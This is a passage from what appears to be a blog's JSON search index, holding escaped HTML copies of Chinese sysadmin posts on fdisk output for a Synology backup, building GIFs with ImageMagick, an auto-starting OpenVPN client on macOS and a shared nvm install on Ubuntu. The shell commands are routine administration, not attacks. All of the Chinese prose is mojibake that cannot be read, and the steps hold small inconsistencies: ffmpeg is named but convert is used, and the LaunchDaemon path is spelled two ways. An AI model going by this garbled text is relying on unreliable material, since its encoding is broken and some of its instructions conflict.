\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdb2             \u003cspan class=\"m\"\u003e311\u003c/span\u003e         \u003cspan class=\"m\"\u003e572\u003c/span\u003e     \u003cspan class=\"m\"\u003e2097152\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e2\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdb3             \u003cspan class=\"m\"\u003e588\u003c/span\u003e      \u003cspan class=\"m\"\u003e243201\u003c/span\u003e  1948793440+ fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sdc: 2000.3 GB, \u003cspan class=\"m\"\u003e2000398934016\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e255\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e63\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e243201\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e16065\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e8225280\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdc1               \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e311\u003c/span\u003e     \u003cspan class=\"m\"\u003e2490240\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e1\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdc2             \u003cspan class=\"m\"\u003e311\u003c/span\u003e         \u003cspan class=\"m\"\u003e572\u003c/span\u003e     \u003cspan class=\"m\"\u003e2097152\u003c/span\u003e  fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePartition \u003cspan class=\"m\"\u003e2\u003c/span\u003e does not end on cylinder boundary  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdc3             \u003cspan class=\"m\"\u003e588\u003c/span\u003e      \u003cspan class=\"m\"\u003e243201\u003c/span\u003e  1948793440+ fd Linux raid autodetect\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDisk /dev/sdu: \u003cspan class=\"m\"\u003e4227\u003c/span\u003e MB, \u003cspan class=\"m\"\u003e4227858432\u003c/span\u003e bytes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e heads, \u003cspan class=\"m\"\u003e32\u003c/span\u003e sectors/track, \u003cspan class=\"m\"\u003e64512\u003c/span\u003e cylinders  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUnits\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e cylinders of \u003cspan class=\"m\"\u003e128\u003c/span\u003e * \u003cspan class=\"nv\"\u003e512\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e65536\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   Device Boot      Start         End      Blocks  Id System\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sdu1   *           \u003cspan class=\"m\"\u003e1\u003c/span\u003e         \u003cspan class=\"m\"\u003e256\u003c/span\u003e       16352+  e Win95 FAT16 \u003cspan class=\"o\"\u003e(\u003c/span\u003eLBA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3å—2Tçš„ç›˜ï¼Œæ¯ä¸ªç›˜æœ‰3ä¸ªåˆ†åŒºï¼Œç„¶åæœ€åæ˜¯USBç›˜ï¼Œç›˜ç¬¦sduï¼Œå¤‡ä»½å®ƒ\u003c/p\u003e","title":"ç¾¤æ™–(é»‘ç¾¤æ™–)çš„å¤‡ä»½"},{"content":"ç”¨ffmpegå°±å¾ˆç®€å•äº†\né¦–å…ˆæŠŠè¦åˆå¹¶çš„jpgéƒ½å˜æˆåˆé€‚çš„å°ºå¯¸\nconvert -resize 300x *.jpg ç„¶åå˜gif\nconvert -delay 30 -loop 0 1.jpg 2.jpg 3.jpg 4.jpg result.gif -loop 0 è¡¨ç¤ºæ— é™å¾ªç¯ -delay 30 è¡¨ç¤ºæ¯å¸§ä¹‹é—´ç­‰å¾…çš„æ—¶é—´\n","permalink":"https://rendoumi.com/posts/20240119-jpg_gif/","summary":"\u003cp\u003eç”¨ffmpegå°±å¾ˆç®€å•äº†\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæŠŠè¦åˆå¹¶çš„jpgéƒ½å˜æˆåˆé€‚çš„å°ºå¯¸\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econvert -resize 300x *.jpg  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå˜gif\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econvert -delay \u003cspan class=\"m\"\u003e30\u003c/span\u003e -loop \u003cspan class=\"m\"\u003e0\u003c/span\u003e 1.jpg 2.jpg 3.jpg 4.jpg result.gif  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e-loop 0 è¡¨ç¤ºæ— é™å¾ªç¯ -delay 30 è¡¨ç¤ºæ¯å¸§ä¹‹é—´ç­‰å¾…çš„æ—¶é—´\u003c/p\u003e","title":"å¦‚ä½•æŠŠjpgåˆæˆgif"},{"content":"æ²¡åŠæ³•ï¼Œç½‘ç»œç¯å¢ƒå¤ªçƒ‚ï¼Œåªèƒ½è£…ä¸ªopenvpn clientè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œç³»ç»Ÿæ˜¯macï¼Œè¦æ±‚ä¸€ç›´ä¿æŒè¿æ¥ï¼Œè¿˜è¦èƒ½é‡å¯è‡ªåŠ¨è¿ã€‚\nå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\n1.å®‰è£…openvpn\nbrew install openvpn 2.å®‰è£…tun/tapé©±åŠ¨\nwget http://downloads.sourceforge.net/tuntaposx/tuntap_20150118.tar.gz tar zxvf tuntap_20150118.tar.gz ç„¶ååœ¨mac osæ¡Œé¢ä¸‹ï¼ŒåŒå‡»tuntap_20150118.pkgå®‰è£… 3.å‡†å¤‡client.confæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯æ ‡å‡†çš„clientç«¯æ–‡ä»¶\n4.æµ‹è¯•æ˜¯å¦å¯ä»¥æ­£å¸¸å¯åŠ¨\n/usr/local/opt/openvpn/sbin/openvpn --config /usr/local/etc/openvpn/ddky.conf 5.æµ‹è¯•æˆåŠŸååœ¨mac osç¼–å†™plistæ–‡ä»¶\nvi /Library/LaunchDaemons/net.openvpn.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple Computer//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;net.openvpn\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;NetworkState\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;key\u0026gt;Program\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/usr/local/opt/openvpn/sbin/openvpn\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;openvpn\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;--config\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;/usr/local/etc/openvpn/client.conf\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;TimeOut\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;90\u0026lt;/integer\u0026gt; \u0026lt;key\u0026gt;WorkingDirectory\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/usr/local/etc/openvpn\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; 6.ç„¶åè¿è¡Œ\nsudo chown root:wheel /Library/LaunchDaemon/net.openvpn.plist sudo launchctl load /Library/LaunchDaemon/net.openvpn.plist æœ‰ç”¨çš„å‘½ä»¤ï¼š\nsudo launchctl load /Library/LaunchDaemon/net.openvpn.plist sudo launchctl unload /Library/LaunchDaemon/net.openvpn.plist sudo launchctl start /Library/LaunchDaemon/net.openvpn sudo launchctl stop /Library/LaunchDaemon/net.openvpn ","permalink":"https://rendoumi.com/posts/20240119-macos_vpn/","summary":"\u003cp\u003eæ²¡åŠæ³•ï¼Œç½‘ç»œç¯å¢ƒå¤ªçƒ‚ï¼Œåªèƒ½è£…ä¸ªopenvpn clientè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œç³»ç»Ÿæ˜¯macï¼Œè¦æ±‚ä¸€ç›´ä¿æŒè¿æ¥ï¼Œè¿˜è¦èƒ½é‡å¯è‡ªåŠ¨è¿ã€‚\u003c/p\u003e\n\u003cp\u003eå®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e1.å®‰è£…openvpn\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebrew install openvpn  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2.å®‰è£…tun/tapé©±åŠ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://downloads.sourceforge.net/tuntaposx/tuntap_20150118.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf tuntap_20150118.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç„¶ååœ¨mac osæ¡Œé¢ä¸‹ï¼ŒåŒå‡»tuntap_20150118.pkgå®‰è£…\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3.å‡†å¤‡client.confæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯æ ‡å‡†çš„clientç«¯æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003e4.æµ‹è¯•æ˜¯å¦å¯ä»¥æ­£å¸¸å¯åŠ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/opt/openvpn/sbin/openvpn --config /usr/local/etc/openvpn/ddky.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e5.æµ‹è¯•æˆåŠŸååœ¨mac osç¼–å†™plistæ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /Library/LaunchDaemons/net.openvpn.plist  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;?xml \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1.0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eencoding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;UTF-8\u0026#34;\u003c/span\u003e?\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;!DOCTYPE plist PUBLIC \u003cspan class=\"s2\"\u003e\u0026#34;-//Apple Computer//DTD PLIST 1.0//EN\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;plist \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1.0\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;dict\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;string\u0026gt;net.openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;dict\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;key\u0026gt;NetworkState\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;true/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/dict\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;Program\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;string\u0026gt;/usr/local/opt/openvpn/sbin/openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;array\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;string\u0026gt;openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;string\u0026gt;--config\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;string\u0026gt;/usr/local/etc/openvpn/client.conf\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/array\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;true/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;TimeOut\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;integer\u0026gt;90\u0026lt;/integer\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;WorkingDirectory\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;string\u0026gt;/usr/local/etc/openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/dict\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/plist\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e6.ç„¶åè¿è¡Œ\u003c/p\u003e","title":"mac osä¸‹å®‰è£…openvpnå®¢æˆ·ç«¯å¹¶è®¾ç½®è‡ªå¯åŠ¨"},{"content":"æœ€è¿‘å·¥ä½œæ¯”è¾ƒå¤šåœ¨Ubuntuå¹³å°ä¸‹ã€‚\nç”¨visualenvå’Œnvmæ¯”è¾ƒå¤šï¼Œä½†æ˜¯nvmé‡åˆ°çš„é—®é¢˜æ¯”è¾ƒå¤šã€‚\næ¯”å¦‚jenkinsè°ƒç”¨nvmå°±æ¯”è¾ƒéº»çƒ¦\nå¦‚ä½•ç”¨ç”¨rootç”¨æˆ·ç»™æ‰€æœ‰ç”¨æˆ·éƒ½è£…ä¸Šç»Ÿä¸€çš„nvmå‘¢ï¼Ÿ\n1ã€é¦–å…ˆå®‰è£…åŸºæœ¬ä¾èµ–åŒ…:\napt-get install build-essential openssl libssl-dev curl 2ã€å»ºä¸ªå…¬å…±ç»„ï¼Œè¿™ä¸ªç»„çš„æˆå‘˜å¯ä»¥æ§åˆ¶nvmï¼š\ngroupadd dev 3ã€gitå…‹éš†ä¸‹è½½nvmçš„ä»£ç \ngit clone https://github.com/creationix/nvm.git /opt/nvm 4ã€å»ºç«‹ä¸¤ä¸ªå…¬ç”¨ç›®å½•ï¼Œä¸€ä¸ªæ˜¯æ”¾nvmï¼Œä¸€ä¸ªæ˜¯æ”¾nodejsçš„npmï¼Œå¹¶è®¾ç½®å¥½æƒé™\nmkdir /usr/local/nvm mkdir /usr/local/node chown -R root:dev /usr/local/nvm chmod -R 775 /usr/local/nvm chown -R root:dev /usr/local/node chmod -R 775 /usr/local/node 5ã€å»ºç«‹å¥½å…¬ç”¨çš„ /etc/profile.d/nvm.sh ä¾›æ‰€æœ‰äººsourceç”¨ï¼Œæ³¨æ„ï¼Œsourceå‘½ä»¤æ˜¯bashä¸‹ç”¨çš„ï¼Œå¦‚æœæ˜¯shï¼Œå°±ç”¨.æ›¿ä»£ã€‚\nexport NVM_DIR=/usr/local/nvm source /opt/nvm/nvm.sh export NPM_CONFIG_PREFIX=/usr/local/node export PATH=\u0026#34;/usr/local/node/bin:$PATH\u0026#34; 6ã€æ–­å¼€é‡æ–°ç™»å½•ï¼ŒåŠ è½½nvm\nnvm --version 7ã€å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„node\nnvm install V18.18.2 8ã€è®¾ç½®ç¼ºçœnodeçš„ç‰ˆæœ¬\nnvm alias default V18.18.2 9ã€éšåæŠŠç”¨æˆ·æ‹‰è¿›devç»„ï¼Œç„¶åç™»é™†å°±å¯ä»¥äº†ã€‚éªŒè¯å‘½ä»¤å¦‚ä¸‹ï¼š\nnvm list node -v ","permalink":"https://rendoumi.com/posts/20240119-nvm_forall/","summary":"\u003cp\u003eæœ€è¿‘å·¥ä½œæ¯”è¾ƒå¤šåœ¨Ubuntuå¹³å°ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eç”¨visualenvå’Œnvmæ¯”è¾ƒå¤šï¼Œä½†æ˜¯nvmé‡åˆ°çš„é—®é¢˜æ¯”è¾ƒå¤šã€‚\u003c/p\u003e\n\u003cp\u003eæ¯”å¦‚jenkinsè°ƒç”¨nvmå°±æ¯”è¾ƒéº»çƒ¦\u003c/p\u003e\n\u003cp\u003eå¦‚ä½•ç”¨ç”¨rootç”¨æˆ·ç»™æ‰€æœ‰ç”¨æˆ·éƒ½è£…ä¸Šç»Ÿä¸€çš„nvmå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003e1ã€é¦–å…ˆå®‰è£…åŸºæœ¬ä¾èµ–åŒ…:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get install build-essential openssl libssl-dev curl  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2ã€å»ºä¸ªå…¬å…±ç»„ï¼Œè¿™ä¸ªç»„çš„æˆå‘˜å¯ä»¥æ§åˆ¶nvmï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egroupadd dev  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3ã€gitå…‹éš†ä¸‹è½½nvmçš„ä»£ç \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/creationix/nvm.git /opt/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e4ã€å»ºç«‹ä¸¤ä¸ªå…¬ç”¨ç›®å½•ï¼Œä¸€ä¸ªæ˜¯æ”¾nvmï¼Œä¸€ä¸ªæ˜¯æ”¾nodejsçš„npmï¼Œå¹¶è®¾ç½®å¥½æƒé™\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown -R root:dev /usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod -R \u003cspan class=\"m\"\u003e775\u003c/span\u003e /usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown -R root:dev /usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod -R \u003cspan class=\"m\"\u003e775\u003c/span\u003e /usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e5ã€å»ºç«‹å¥½å…¬ç”¨çš„ /etc/profile.d/nvm.sh ä¾›æ‰€æœ‰äººsourceç”¨ï¼Œæ³¨æ„ï¼Œsourceå‘½ä»¤æ˜¯bashä¸‹ç”¨çš„ï¼Œå¦‚æœæ˜¯shï¼Œå°±ç”¨.æ›¿ä»£ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eNVM_DIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e /opt/nvm/nvm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eNPM_CONFIG_PREFIX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/usr/local/node/bin:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e6ã€æ–­å¼€é‡æ–°ç™»å½•ï¼ŒåŠ è½½nvm\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm 